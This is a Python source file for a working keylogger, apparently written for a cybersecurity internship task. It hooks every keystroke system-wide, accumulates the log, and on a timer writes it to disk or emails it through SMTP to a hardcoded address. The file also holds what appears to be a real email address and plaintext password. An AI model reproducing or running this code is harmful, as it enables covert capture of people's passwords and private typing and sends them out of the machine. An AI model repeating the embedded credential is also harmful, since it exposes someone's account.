import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "kapoorpiyush0103@outlook.com"
EMAIL_PASSWORD = "kapoor65231992"

class Keylogger:
    def __init__(self, interval, report_method="file"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                # if Key.enter, use a new line
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"/d:/Cyber_security_internship_tasks/keylogger/keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        # open the file in write mode
        with open(f"{self.filename}.txt", "a") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternate")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger Logs"

        html = f"<p>{message}</p>"
        text_part = MIMEText(html, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()
    
    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing the keylogs")
        
    def report(self):
        print(f"{datetime.now()} - Report method called")  # Debug statement
        if self.log:
            print(f"{datetime.now()} - Log is not empty")  # Debug statement
            self.end_dt = datetime.now()
            self.update_filename()
            print(f"{datetime.now()} - Filename: {self.filename}")  # Debug statement
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.prepare_mail(self.log))
            elif self.report_method == "file":
                self.report_to_file()
                # if you want to print in the console the recorded logs
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        else:
            print(f"{datetime.now()} - Log is empty")  # Debug statement
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            print(f"{datetime.now()} - Keylogger stopped")

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
